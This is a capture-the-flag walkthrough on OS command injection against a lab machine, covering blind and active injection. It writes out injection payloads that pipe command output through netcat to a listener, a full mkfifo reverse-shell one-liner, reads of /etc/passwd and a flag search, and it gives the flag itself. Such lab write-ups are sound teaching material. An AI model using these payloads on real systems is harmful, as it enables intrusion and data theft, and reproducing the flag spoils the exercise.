> OS Command Injection | Introduction

export IP=10.10.245.141

# Blind Command Injection

When a server side code doesn't give any response back. We don't know if the site is responding back or not. There are 3 methods to identify it.

1. Ping => By sending 10 ICMP packets it takes 10 second delay 
2. Redirecting output using `>`
3. Using netcat `root; ls -la | nc 10.8.107.21 1234`

1. Ping the box with 10 packets.

```
& ping -c 10 $IP
```

2. Redirect the box's Linux Kernel Version to a file on the web server.  What is the Linux Kernel Version?

root; uname -r | nc 10.8.107.21 1234

```
4.15.0-101
```

# Active Command Injection

This attack show us the output through the browser. To get active command injection we can navigate to `evilshell.php` which gives us a command line. 

1. What strange text file is in the website root directory?

ls -la

```
drpepper.tx
```

2. How many non-root/non-service/non-daemon users are there?

```
cat /etc/passwd => 0
```

3. What user is this app running as?

```
whoami => www-data
```

4. What is the user's shell set as?

getent passwd www-data

**NOTE: getent gives us the entries in a number of text files called databases**

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
```

5. What version of Ubuntu is running?

lsb_release -a

```
18.04.4
```

6. Print out the MOTD.  What favorite beverage is shown? (Message Of The Day)

/etc/upadate-motd.d/header-00

```
#!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)" DR PEPPER MAKES THE WORLD TASTE BETTER! 
```

# Find the flag 

In evilshell.php, type `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f` to get reverse shell.

Now we don't have any users. We navigate to / and type `find / -name *.txt 2>/dev/null | more`

Among a list of all file we have /etc/flag.txt

```
65fa0513383ee486f89450160f3aa4c4
```